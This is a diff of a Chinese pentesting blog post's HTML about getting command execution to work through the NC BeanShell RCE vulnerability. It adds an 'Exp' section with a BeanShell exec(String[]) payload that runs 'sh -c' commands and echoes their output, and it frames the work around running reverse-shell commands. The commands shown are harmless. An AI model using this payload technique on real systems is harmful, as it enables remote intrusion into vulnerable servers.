@@ -6,16 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="最近在测试过程中遇到了NC BeanShell RCE漏洞，网络上大部分都是用BeanShell自带的exec函数执行反弹shell命令，但无法直接执行反弹shell。  寻根溯源exec函数在BeanShell中定义如下  参数是一个String类型，并且根据下面的描述是调用了Runtime.getRuntime().exec()。 搞过Java命令执行的都知道，Java如果要执行命令不能向p">
+    <meta name="description" content="最近在测试过程中遇到了NC BeanShell RCE漏洞，网络上大部分都是用BeanShell自带的 exec函数执行反弹shell命令，但无法直接执行反弹shell。  寻根溯源exec函数在BeanShell中定义如下  参数是一个 String类型，并且根据下面的描述是调用了 Runtime.getRuntime().exec()。 搞过Java命令执行的都知道，Java如果要执行命令不">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BeanShell RCE 排坑">
 <meta property="og:url" content="https://arrnitage.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/index.html">
 <meta property="og:site_name" content="Hi, I&#39;m Arm!tage.">
-<meta property="og:description" content="最近在测试过程中遇到了NC BeanShell RCE漏洞，网络上大部分都是用BeanShell自带的exec函数执行反弹shell命令，但无法直接执行反弹shell。  寻根溯源exec函数在BeanShell中定义如下  参数是一个String类型，并且根据下面的描述是调用了Runtime.getRuntime().exec()。 搞过Java命令执行的都知道，Java如果要执行命令不能向p">
+<meta property="og:description" content="最近在测试过程中遇到了NC BeanShell RCE漏洞，网络上大部分都是用BeanShell自带的 exec函数执行反弹shell命令，但无法直接执行反弹shell。  寻根溯源exec函数在BeanShell中定义如下  参数是一个 String类型，并且根据下面的描述是调用了 Runtime.getRuntime().exec()。 搞过Java命令执行的都知道，Java如果要执行命令不">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://arrnitage.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/Untitled.png">
+<meta property="og:image" content="https://arrnitage.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/1671776451881.png">
 <meta property="article:published_time" content="2022-05-06T10:42:34.000Z">
-<meta property="article:modified_time" content="2022-05-06T10:42:34.105Z">
+<meta property="article:modified_time" content="2022-12-23T07:38:24.499Z">
 <meta property="article:author" content="Arm!tage">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://arrnitage.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/Untitled.png">
@@ -109,7 +110,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%A0%B9%E6%BA%AF%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">寻根溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">解决方法</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%A0%B9%E6%BA%AF%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">寻根溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">解决方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">3.</span> <span class="toc-text">Exp</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -149,22 +150,25 @@
 
   <div class="content" itemprop="articleBody">
     <blockquote>
-<p>最近在测试过程中遇到了<strong>NC BeanShell RCE</strong>漏洞，网络上大部分都是用BeanShell自带的<code>exec</code>函数执行反弹shell命令，但无法直接执行反弹shell。</p>
+<p>最近在测试过程中遇到了<strong>NC BeanShell RCE</strong>漏洞，网络上大部分都是用BeanShell自带的 <code>exec</code>函数执行反弹shell命令，但无法直接执行反弹shell。</p>
 </blockquote>
 <h2 id="寻根溯源"><a href="#寻根溯源" class="headerlink" title="寻根溯源"></a>寻根溯源</h2><p><code>exec</code>函数在BeanShell中定义如下</p>
 <p><img src="/BeanShell-RCE-%E6%8E%92%E5%9D%91/Untitled.png" alt="Untitled"></p>
-<p>参数是一个<code>String</code>类型，并且根据下面的描述是调用了<code>Runtime.getRuntime().exec()</code>。</p>
-<p>搞过Java命令执行的都知道，Java如果要执行命令不能向python之类的直接通过字符串执行命令，需要将命令转化为<code>String[]</code>类型</p>
+<p>参数是一个 <code>String</code>类型，并且根据下面的描述是调用了 <code>Runtime.getRuntime().exec()</code>。</p>
+<p>搞过Java命令执行的都知道，Java如果要执行命令不能向python之类的直接通过字符串执行命令，需要将命令转化为 <code>String[]</code>类型</p>
 <p>所以网络上大部分的poc&#x2F;exp都是只能执行部分命令，无法执行带有各种管道、参数的命令。</p>
+<p>由于在cmd与bash中各种命令的实现不同，比如在Linux中<code>id</code>是一个elf程序，而<code>echo</code>则更像是一种宏。且beanshell中原本exec定义是传入字符串，但具体的实现方法Runtime.getRuntime.exec允许传入字符串数组重载。所以我们只需要将exec重新实现一遍即可</p>
 <h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决方法也非常简单，既然这里可以使用beanshell script进行命令执行，那我们直接自己用Runtime exec构造命令执行代码就完事了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>
 
 <p>用了这个payload发现命令可以执行了，但是网站没有回显，写成脚本也没有办法直接获取一些命令的结果，就还得通过生成文件再查看结果，太丑陋了！！</p>
-<p>就想到如果我知道<code>exec</code>方法的实现过程，我再根据这个实现过程去实现刚才的payload就可以完成结果回显。</p>
-<p>直接去找beanshell项目，查找<code>exec</code>方法</p>
+<p>就想到如果我知道 <code>exec</code>方法的实现过程，我再根据这个实现过程去实现刚才的payload就可以完成结果回显。</p>
+<p>直接去找beanshell项目，查找 <code>exec</code>方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    Start an external application using the Java Runtime exec() method.</span></span><br><span class="line"><span class="comment">    Display any output to the standard BeanShell output using print().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">bsh.help.exec = <span class="string">&quot;usage: exec( String arg )&quot;</span>;</span><br><span class="line"></span><br><span class="line">exec( String arg )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.proc = Runtime.getRuntime().exec(arg);</span><br><span class="line">    <span class="built_in">this</span>.din = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>( proc.getInputStream() );</span><br><span class="line">    <span class="keyword">while</span>( (line=din.readLine()) != <span class="literal">null</span> )</span><br><span class="line">        print(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>可以看到它也是用beanshell实现的，我直接开抄。问题优雅解决&lt;(￣︶￣)&gt;</p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exec( String[] arg )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.proc = Runtime.getRuntime().exec(arg);</span><br><span class="line">    <span class="built_in">this</span>.din = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>( proc.getInputStream() );</span><br><span class="line">    <span class="keyword">while</span>( (line=din.readLine()) != <span class="literal">null</span> )</span><br><span class="line">        print(line);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.proc.exitValue();</span><br><span class="line">&#125;</span><br><span class="line">exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 123&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/BeanShell-RCE-%E6%8E%92%E5%9D%91/1671776451881.png" alt="1671776451881"></p>
 
   </div>
 </article>
@@ -190,7 +194,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%A0%B9%E6%BA%AF%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">寻根溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">解决方法</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%A0%B9%E6%BA%AF%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">寻根溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">解决方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">3.</span> <span class="toc-text">Exp</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
